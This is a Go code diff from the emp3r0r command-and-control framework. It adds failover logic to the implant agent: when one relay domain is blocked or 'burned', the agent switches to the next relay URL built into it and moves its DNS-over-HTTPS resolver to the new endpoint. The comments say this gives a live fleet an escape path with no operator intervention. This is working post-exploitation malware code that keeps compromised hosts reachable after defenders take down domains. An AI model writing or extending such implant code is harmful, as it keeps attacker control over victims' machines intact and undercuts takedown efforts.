@@ -4,14 +4,18 @@ import (
 	"context"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
+	"net/url"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+	"github.com/ncruces/go-dns"
 )
 
 // EstablishC2Connection connects to C2 using the configured wrapper mode.
@@ -46,6 +50,7 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 
 	rw, err := establishChannelStream(ctx, url, channelWrapper)
 	if err != nil {
+		nextRelayEndpoint(url)
 		cancel()
 		return nil, nil, nil, err
 	}
@@ -84,6 +89,106 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 	}
 
 	return secureConn, ctx, cancel, nil
+}
+
+// relayMu serializes endpoint rotation across concurrent failing streams.
+var relayMu sync.Mutex
+
+// nextRelayEndpoint rotates def.CCAddress to the next relay endpoint after a
+// dial failure. Agents embed the full relay URL list (role=agent) at build
+// time; trying them in order gives a live fleet an escape path when one relay
+// domain gets burned — the next reconnect attempt automatically targets the
+// next endpoint, no operator intervention required.
+//
+// Direct (non-relay) C2 addresses and single-endpoint configs never rotate.
+// All endpoints reach the SAME CC (it dials out to every relay it listens on),
+// so endpoint identity is transport-level only: sessions, keys and routing are
+// unaffected by which relay a stream rides.
+func nextRelayEndpoint(failedURL string) {
+	relayMu.Lock()
+	defer relayMu.Unlock()
+
+	urls := common.RuntimeConfig.RelayURLs
+	if len(urls) < 2 || !strings.Contains(failedURL, "role=agent") {
+		return
+	}
+	idx := -1
+	for i, u := range urls {
+		if u == failedURL {
+			idx = i
+			break
+		}
+	}
+	if idx < 0 {
+		return
+	}
+	next := urls[(idx+1)%len(urls)]
+	def.CCAddress = next
+	common.RuntimeConfig.CCAddress = next
+	logging.Warningf("relay endpoint unreachable, failing over: %s -> %s", maskURLSecret(failedURL), maskURLSecret(next))
+
+	// DoH often shares the relay's fate: genagent pins it to the first
+	// endpoint's host (/dns route of the same Worker domain). If the burned
+	// domain is also our DNS server, re-home DoH onto the next endpoint,
+	// otherwise we could not even RESOLVE the failover target.
+	rotateDoH(failedURL, next)
+}
+
+// rotateDoH re-homes the DoH server onto the failover target's /dns route
+// when the old DoH host matches the failed endpoint's host.
+func rotateDoH(failedURL, nextURL string) {
+	if common.RuntimeConfig.DoHServer == "" {
+		return
+	}
+	failedHost := hostOf(failedURL)
+	if failedHost == "" || !strings.Contains(common.RuntimeConfig.DoHServer, failedHost) {
+		return
+	}
+	newDoH := deriveDoH(nextURL)
+	if newDoH == "" {
+		return
+	}
+	if resolver, err := dns.NewDoHResolver(newDoH, dns.DoHCache()); err == nil && resolver != nil {
+		net.DefaultResolver = resolver
+		common.RuntimeConfig.DoHServer = newDoH
+		logging.Warningf("DoH re-homed to failover endpoint: %s", hostOf(nextURL))
+	}
+}
+
+// deriveDoH builds the /dns route URL for a relay endpoint's host.
+func deriveDoH(endpointURL string) string {
+	host := hostOf(endpointURL)
+	secret := queryParam(endpointURL, "secret")
+	if host == "" || secret == "" {
+		return ""
+	}
+	return fmt.Sprintf("https://%s/dns?secret=%s", host, secret)
+}
+
+func hostOf(rawURL string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return ""
+	}
+	return u.Hostname()
+}
+
+func queryParam(rawURL, key string) string {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return ""
+	}
+	return u.Query().Get(key)
+}
+
+// maskURLSecret hides the secret query parameter in logs (agent-side copy).
+func maskURLSecret(u string) string {
+	for i := 0; i+8 <= len(u); i++ {
+		if u[i:i+8] == "&secret=" {
+			return u[:i+8] + "***"
+		}
+	}
+	return u
 }
 
 // isBootstrapRoute reports whether the given MsgAuth capabilities target the
